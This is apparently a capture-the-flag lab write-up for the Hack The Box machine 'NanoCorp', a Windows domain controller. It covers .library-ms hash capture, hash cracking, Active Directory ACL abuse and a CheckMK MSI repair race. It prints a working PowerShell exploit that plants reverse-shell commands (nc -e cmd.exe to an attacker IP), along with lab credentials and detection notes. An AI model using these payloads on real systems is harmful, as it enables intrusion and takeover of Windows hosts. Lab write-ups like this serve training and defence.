# NanoCorp

OS: Windows / Active Directory\
Difficulty: Hard

**Host:** `DC01.nanocorp.htb` (Windows Server 2022, Build 20348) · **Domain:** `nanocorp.htb`

**Tags:** `#htb` `#windows` `#active-directory` `#library-ms` `#responder` `#netntlmv2` `#bloodhound` `#addself` `#forcechangepassword` `#msi-repair-race` `#runascs` `#checkmk`

## Attack path

```
CheckMK agent on TCP/6556 enumerated
  → malicious .library-ms upload → web_svc NetNTLMv2 leaked to Responder
  → crack → web_svc : dksehdgh712!@#
  → BloodHound: AddSelf → IT_SUPPORT, ForceChangePassword → monitoring_svc
  → reset monitoring_svc → Dolphin08 → Kerberos TGT → WinRM (user.txt)
  → CheckMK Agent 2.1 MSI repair race (as web_svc via RunasCs) → SYSTEM (root.txt)
```

## Accounts

| Account | Secret | Source |
|---|---|---|
| web_svc | `dksehdgh712!@#` | NetNTLMv2 crack |
| monitoring_svc | `Dolphin08` | reset via IT_SUPPORT |

## Enumeration

```bash
sudo nmap -Pn -T5 -sV -sC -p- 10.129.243.199 -oN NanoCorp --open --reason
```
Key ports: 53, 80 (Apache/PHP), 88, 389/636, 445, 3389, 5986 (WinRM/TLS), **6556 (check_mk 2.1.0p10)**, 9389. SMB signing required on the DC (blocks SMB relay, but not PtH / spraying / Kerberoast / LDAP-or-HTTP relay).

Subdomain fuzz:
```bash
ffuf -u 'http://nanocorp.htb/' -w .../bitquark-subdomains-top100000.txt -H 'Host: FUZZ.nanocorp.htb' -ac -t 200
# hire   [Status: 200]  → hire.nanocorp.htb (resume/ZIP upload form)
```

### CheckMK agent (plaintext over 6556)
```bash
nc -nv 10.129.243.199 6556
# <<<check_mk>>> Version: 2.1.0p10 ... AgentOS: windows ... Hostname: DC01
# Agent running as SYSTEM, CheckmkService enabled, MSI-based install
```

## Foothold — .library-ms NetNTLMv2 capture

The hiring form processes uploaded ZIPs via the Windows Explorer backend (`web_svc`'s `explorer.exe`). A `.library-ms` file with a remote `simpleLocation` URL forces an SMB authentication to the attacker.

```xml
<!-- Documents.library-ms -->
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation><url>\\10.10.15.239\share</url></simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```
ZIP it, upload it, run Responder, catch the hash:
```bash
sudo responder -I tun0
# [SMB] NTLMv2-SSP Username : NANOCORP\web_svc
# [SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:...
```
```bash
hashid hash            # NetNTLMv2
hashcat -a 0 hash /usr/share/wordlists/rockyou.txt   # -m 5600 auto-detected
# web_svc : dksehdgh712!@#
```

## Lateral movement — BloodHound ACL abuse

```bash
netexec ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' --dns-server 10.129.243.199 --bloodhound -c All
```
Findings: `web_svc` can **AddSelf** to `IT_SUPPORT`; `IT_SUPPORT` has **ForceChangePassword** on `monitoring_svc`.

```bash
bloodyad --host 10.129.243.199 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember 'IT_SUPPORT' web_svc
bloodyad --host 10.129.243.199 -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Dolphin08'
```

Get a TGT and WinRM in (clock skew → `faketime 'now +7 hours'`, WinRM over TLS on 5986):
```bash
faketime 'now +7 hours' impacket-getTGT "nanocorp.htb/monitoring_svc:Dolphin08" -dc-ip 10.129.18.20
export KRB5CCNAME=monitoring_svc.ccache
faketime 'now +7 hours' evil-winrm -i dc01.nanocorp.htb -S -P 5986 -r NANOCORP.HTB -K monitoring_svc.ccache
# cat user.txt
```

## Privilege escalation — CheckMK Agent MSI repair race → SYSTEM

`monitoring_svc` can drop files and trigger an MSI repair, but can't win the race alone; the payload must run from `web_svc`'s context via `RunasCs`.

Enumerate the installed package and its cached MSI:
```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
  Where-Object { $_.DisplayName -like '*mk*' } | Select DisplayName,DisplayVersion,LocalPackage
# Check MK Agent 2.1  2.1.0.50010  C:\Windows\Installer\1e6f2.msi
```

### Exploit logic
A Windows Installer **repair** (`msiexec /fa`) runs through the Installer service in a **SYSTEM** context regardless of caller. The CheckMK repair custom action executes leftover `cmk_all_*.cmd` staging scripts it finds in the **world-writable** `C:\Windows\Temp`. The exact numeric suffix isn't predictable, so the exploit **sprays ~30,000 correctly-named decoy `.cmd` files** so whichever one the installer looks for already exists with attacker content.

`payload.ps1`:
```powershell
$LHOST="10.10.15.239"; $LPORT="1337"
$NcPath="C:\Users\monitoring_svc\Documents\nc.exe"
$BatchPayload="@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

$msi=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' |
      Where-Object {$_.DisplayName -like '*mk*'} | Select -First 1).LocalPackage

foreach($ctr in 0..1){
  for($num=1000;$num -le 15000;$num++){
    $filePath="C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
    try{
      [System.IO.File]::WriteAllText($filePath,$BatchPayload,[System.Text.Encoding]::ASCII)
      Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
    }catch{}
  }
}
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
```

### Why files go to `C:\Windows\Temp`
1. **Access** — `web_svc` can't read `monitoring_svc`'s `Documents` (default per-user NTFS ACL), so the first `RunasCs ... -File C:\Users\monitoring_svc\Documents\payload.ps1` failed. `C:\Windows\Temp` has a permissive drop-box ACL (write/create for all, often no list) so both accounts can reach it.
2. **Target** — it's also exactly where the CheckMK repair custom action scans for its `cmk_all_*` artifacts.

### Execution
```
C:\Windows\Temp\RunasCs.exe web_svc "dksehdgh712!@#" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1"
```
`RunasCs` reporting "No output received" is expected (detached process). With `nc -lnvp 1337` listening, the SYSTEM-context repair executes a planted `.cmd` → SYSTEM shell → `C:\Users\Administrator\Desktop\root.txt`.

## Root cause

A TOCTOU-style local privesc from two compounding issues:
1. A non-admin-triggerable MSI repair path exists (repair always runs as SYSTEM).
2. The repair trusts the contents of a world-writable directory for staging scripts without verifying provenance or ownership.

## Detection / defensive notes

- Mass file creation in `C:\Windows\Temp` matching `cmk_all_*` immediately before an `msiexec /fa`.
- `msiexec` spawning `cmd.exe` → `nc.exe` (legitimate repairs don't spawn shells).
- Audit service accounts with MSI-repair rights on monitoring/EDR agents (repair == SYSTEM execution).

---
*Migrated from local Obsidian lab notes. Review evidence before reuse.*
